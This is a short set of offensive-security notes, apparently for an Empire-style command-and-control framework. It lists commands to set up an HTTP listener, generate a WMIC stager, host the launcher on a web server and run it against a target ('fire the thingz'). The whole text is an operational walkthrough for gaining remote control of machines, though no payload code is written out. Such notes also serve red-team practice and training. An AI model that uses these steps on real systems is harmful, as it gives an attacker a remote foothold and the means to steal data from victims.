NOTE: *Other options are available for various 'use' statements. Explore yourself.*

#### Set up a listener ####

1. ```listeners```

2. ```use http```

3. ```list```

4. ```options```

5. ```set $option```

6. ```start```


#### Stagers ####

NOTE: *Use tab to access dropdowns*

1. Select ```stagers``` from dropdown.

2. ```list```

3. ```use wmic```

4. tab > ```generate http```

5. Copy ```Launch with``` path

6. Start webserver 

7. Fire the thingz
